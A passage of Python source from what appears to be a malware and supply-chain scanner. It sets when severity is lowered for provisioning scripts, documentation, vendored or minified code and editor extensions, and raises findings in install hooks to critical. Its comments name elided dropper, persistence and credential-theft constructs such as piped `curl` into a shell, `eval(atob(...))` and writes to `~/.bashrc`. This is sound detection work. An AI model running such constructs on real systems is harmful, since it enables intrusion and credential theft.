                # nor is a credential store, a beacon or a drop point, each its own composite.
                compiled.rule.id in ("SUSPECT.EXFIL.001", "MALWARE.EXFIL.001")
                and CapabilityDetector._agent_run(content, ctx)
                and trusted_destination
            )
            # Not raised back by the install escalation below: agent-run code is in the install
            # set for what no tool needs, and this is what a tool is for.
            agent_tool_client = own_credential_client and CapabilityDetector._agent_run(
                content, ctx
            )
            # A shell, PowerShell, Vagrant, Docker, Nix or patch file that enables a service,
            # writes a unit or appends `export PATH=...` to `~/.bashrc` is provisioning a person
            # runs, persisting configuration rather than anything it fetched. In the long tail
            # that was 400 shell scripts among 769 benign units with this finding; in 4,269
            # malware samples it sat in such a file once, beside rules that block it anyway --
            # the malware's persistence is JavaScript, 564 samples (review 98). Recorded. What
            # persists a download (`curl ... >> ~/.bashrc`, a cron entry running `wget`, a
            # variable filled by `$(curl ...)` and appended to a profile) keeps its grade.
            if Capability.PERSIST in matched and SampleKinds.is_machine_provisioning(
                content.raw, content.path
            ):
                # A script that installs operating-system packages is provisioning a
                # machine, and provisioning a machine IS fetching software and
                # arranging for it to keep running. `ViktorUJ/cks` supplied twenty-one
                # of these -- download kubectl, write a kubelet drop-in, enable the
                # unit, append completion to `.bashrc` -- and
                # `stacksimplify/terraform-on-aws-ec2` seventy-seven copies of `yum
                # install httpd` plus `systemctl enable httpd`.
                #
                # Only the persistence composites, and deliberately so. A dropper is
                # not excused by the same reasoning: piping an unpinned remote script
                # into a shell is a choice a provisioning script still has to answer
                # for, and it is how the one real supply-chain exposure in this corpus
                # works. Nor does this reach an install hook, where the ceiling is
                # applied before the hook escalation and the hook still raises the
                # finding to critical -- which is the case where writing somebody
                # else's cron entry is the attack rather than the installation.
                ceilinged = "a script that provisions a machine"
                if hand_run_provisioning:
                    ceiling = Severity.LOW
            elif hand_run_provisioning:
                ceilinged = "a provisioning script a person runs, persisting configuration"
                ceiling = Severity.LOW
            elif own_credential_client:
                ceilinged = "code a person or a program calls, with no destination of concern"
                ceiling = Severity.LOW
            elif (
                compiled.rule.id == self.CREDENTIAL_STORE_RULE
                and SampleKinds.names_authentication(content.path)
            ):
                # A file named for authentication, reading a credential store. See
                # `core.samples.names_authentication`; scoped to this one rule, because
                # its premise is a store "this component does not own".
                ceilinged = "a file whose name says it handles authentication"
            elif content.is_rule_material:
                # A rule set, or a test case annotated for one. `semgrep/semgrep-rules`
                # supplies `bash/curl/security/curl-eval.bash`, whose whole content is
                # the capability pair the rule next to it matches. See `core.samples`.
                ceilinged = "another analyser's rule material"
                ceiling = RULE_MATERIAL_CEILING
            elif SourcePaths.is_test_material_here(content.path, ctx):
                ceilinged = "test material"
            elif SourcePaths.is_documentation(content.path):
                ceilinged = "documentation"
                if CapabilityDetector._is_prose(content.path):
                    # Prose, which nothing runs: a README's `curl ... | sh` is an instruction to
                    # a person. In the long tail, documentation and Python package metadata were
                    # 79 of 278 benign units warned by `SUSPECT.DROPPER.001` alone, and none of
                    # 4,269 malware samples had a dropper finding in prose (review 98). A
                    # file merely under `docs/` -- Sphinx's `conf.py` -- keeps the ceiling above.
                    ceiling = Severity.LOW
            elif (
                SourcePaths.is_build_tooling(content.path)
                and Capability.FETCH_EXEC not in present
                # Nor a wallet's secret sent out: a build that ships it, ships it.
                and not CapabilityDetector._sends_a_wallet_secret(hits)
                # A published npm package's `build/` and `bin/` are what runs, not what builds.
                and not CapabilityDetector._shipped_output(content.path, ctx)
                # Nor when it wipes the machine: a build script that deletes `$HOME` or `/`
                # runs on every machine that builds, exactly as a piped download does.
                and compiled.rule.id not in CapabilityDetector.DESTRUCTION_RULES
                # A skill's `scripts/` folder is not the project's tooling: the agent runs
                # what is in it whenever the skill is invoked.
                and not CapabilityDetector._skill_script(content.path, ctx)
            ):
                # Unless the file PIPES the network into an interpreter. The ceilings
                # here all rest on one claim -- that a pattern in these paths is
                # "usually written to be read rather than run" -- and a build recipe is
                # the one place where that is false: `curl ... | sh` in a Makefile runs
                # on every machine that builds the project. Without this the
                # `make-fetch-exec` corpus sample, whose entire content is that line,
                # came out at MEDIUM.
                ceilinged = "the project's own build and release tooling"
            elif (
                compiled.rule.id == self.DROPPER_RULE
                and SourcePaths.is_editor_extension(content.path)
                and not CapabilityDetector._runs_a_downloaded_file(hits)
            ):
                # An extension fetching and starting its own tools -- a language server, a CLI,
                # a WSL or container agent -- from code the editor runs: Codespaces, APKLab and
                # DOSBox do it in their main bundle. Reported, below the gate. A download written
                # to an executable and started, as one construct, is not lowered: that is the
                # shape the malicious extensions use, `.bat` droppers included.
                ceilinged = "an editor extension fetching and starting its own tools"
                ceiling = Severity.MEDIUM
            elif content.path.rpartition("!")[2].endswith(".map"):
                # A source map carries the original sources as JSON strings for a debugger to
                # show. Nothing loads it as code, so even a download-and-run construct in it is
                # text -- the bundle it maps is scanned on its own.
                ceilinged = "a source map, which is never run"
            elif (
                SourcePaths.is_generated_artefact(content.path)
                and not CapabilityDetector._runs_a_downloaded_file(hits)
                and not CapabilityDetector._evaluates_a_literal_payload(content)
                and not CapabilityDetector._turns_an_agent_on_the_user(hits)
                and not CapabilityDetector._sends_a_wallet_secret(hits)
            ):
                # Not when the output downloads and runs in one construct. A bundle holds a
                # module loader's decoder and evaluator by construction, which is what this
                # ceiling is for; it holds `curl ... -o x.bat && x.bat` only if somebody put it
                # there, and an editor extension ships nothing but its bundle.
                ceilinged = "generated build output"
            elif SourcePaths.is_vendored(content.path):
                # Somebody else's code, committed. `jart/cosmopolitan` vendors CPython's
                # standard library at `third_party/python/Lib/`, and five of its findings
                # were the import machinery doing what the import machinery does --
                # `_bootstrap_external.py` decodes a pyc and executes it, `nntplib.py`
                # reads `.netrc`, `distutils/command/register.py` reads `.pypirc`.
                #
                # The secrets detector has ceilinged on this since it measured it; this
                # one was comparing every other kind of path and not that one. What it
                # says is that a capability in vendored code belongs to whoever wrote
                # the library, which is a different review from the one this report is.
                ceilinged = "vendored third-party code"
            elif (
                CapabilityDetector._is_minified(content)
                and not CapabilityDetector._runs_a_downloaded_file(hits)
                and not CapabilityDetector._evaluates_a_literal_payload(content)
                and not CapabilityDetector._turns_an_agent_on_the_user(hits)
                and not CapabilityDetector._sends_a_wallet_secret(hits)
            ):
                # The same exceptions as generated output, for the same reasons. The second
                # matters most here: a long encoded payload is itself what makes a hand-written
                # file look minified (`eval(atob('...'))` in `tailwind-animation-effect`).
                ceilinged = "minified output"
            elif verified and compiled.rule.id == self.DROPPER_RULE:
                ceilinged = CapabilityDetector.VERIFIED_DOWNLOAD_REASON
                ceiling = Severity.MEDIUM
            elif (
                compiled.rule.id in self.ON_REQUEST_RULES
                and not in_hook
                and not ctx.in_ci_hook(content.path)
                # A shell script that decodes on the way to running is the encoded-dropper shape
                # and is never lowered. In Python or JavaScript the decode is one of the hits
                # being placed, and it is lowered only if it too sits in a body nothing on the
                # load path reaches -- decoding a GitHub API response in a method is not that.
                and not (
                    Capability.DECODE in present
                    and unit.language in CapabilityDetector.SCRIPT_LANGUAGES_RUN_BY_HAND
                )
            ):
                # Fetch-and-run is HIGH where it runs on its own: an install hook, a pipeline, a
                # `.pth`, a library's top level that executes on import. An `install.sh` or a
                # `script/linux` runs when a person chooses to run it, and a CLI's
                # download-the-browser routine runs when its function is called -- across 333
                # of the most-starred repositories that was 56 blocking findings in 39 of them,
                # every one an installer doing what installers do. The build-file rules
                # (Makefile, Dockerfile, MSBuild, Ansible) keep their own verdict for builds
                # that run unattended; a decoded payload is never excused.
                deferred = CapabilityDetector._run_on_request(
                    content, unit.language, hits, matched, ctx
                )
                if (
                    deferred
                    and compiled.rule.id != self.DROPPER_RULE
                    and SourcePaths.is_editor_extension(content.path)
                ):
                    # An extension's `activate` is called by the editor, so "runs only when called"
                    # does not hold: a beacon there reports the machine on every start. Only the weak
                    # dropper combination -- spawn, decode and a request, which remote-development
                    # tools do all day -- keeps the lowering (`_run_on_request`).
                    deferred = ""
                if (
                    deferred == CapabilityDetector.ON_REQUEST_REASONS[0]
                    and compiled.rule.id == "SUSPECT.PERSIST.001"
                ):
                    # A script that writes what it downloads into `~/.bashrc` or a service unit
                    # keeps running after whoever ran it has gone. Running it by hand is a moment;
                    # what it persists is not.
                    deferred = ""
                if deferred:
                    ceilinged = deferred
                    ceiling = Severity.MEDIUM
                elif compiled.rule.id == self.DROPPER_RULE and self._official_installs_only(
                    content, hits
                ):
                    ceilinged = "the tool's own official installer"
                    ceiling = Severity.MEDIUM
        if ceilinged:
            severity = min(severity, ceiling)
            escalations.append(
                f"reported below its usual severity because it sits in {ceilinged}"
                + (
                    ""
                    if ceilinged in CapabilityDetector.ON_REQUEST_REASONS
                    or ceilinged == "the tool's own official installer"
                    or ceilinged == CapabilityDetector.VERIFIED_DOWNLOAD_REASON
                    else ", where a pattern like this is usually written to be read rather than run"
                )
            )

        if in_hook and not agent_tool_client:
            # This is the escalation that matters most in the whole engine. The
            # identical capability pair is ordinary in application code and is a
            # credential harvester in an install hook, because install-time code
            # runs unprompted, as the developer, with the developer's full
            # environment, before any test, review, container boundary or network
            # policy applies.
            escalations.append(
                "runs during install or build, as the user, before any other control"
            )
            severity = Severity.CRITICAL
            if (
                category is Category.SUSPICIOUS
                and {
                    Capability.CREDENTIAL,
                    Capability.EGRESS,
                }
                <= present
            ):
                category = Category.MALICIOUS
                escalations.append("reads credentials and reaches the network from an install hook")

        is_obfuscated = Capability.DECODE in present

        risk = ctx.scorer.score(
            severity,
            rule.confidence,
            ScoringContext(
                in_install_hook=in_hook,
                capabilities=frozenset(present),
                is_obfuscated=is_obfuscated,
            ),
        )

        contributing = tuple(
            f"{h.rule_id}@{h.line}"
            for h in sorted(hits, key=lambda h: h.byte_start)
            if h.capability in matched
        )

        return Finding(
            rule_id=rule.id,
            category=category,
            severity=severity,
            confidence=rule.confidence,
            message=rule.message,
            location=Location(
                path=content.path,
                line=anchor.line,
                column=content.column_of(anchor.byte_start),
                byte_start=anchor.byte_start,
                byte_end=anchor.byte_end,
                project=unit.project,
            ),
            evidence=evidence,
            remediation=rule.remediation,
            explanation=Explanation(
                summary=rule.title,
                matched_rule=rule.id,
                contributing=contributing,
                escalations=tuple(escalations),
            ),
            risk=risk,
            detector=self.id,
            rule_version=rule.version,
            rulepack=rule.rulepack,
            references=rule.references,
            capabilities=tuple(sorted(matched, key=lambda c: c.value)),
        )


__all__ = ["CapabilityDetector", "CapabilityHit"]
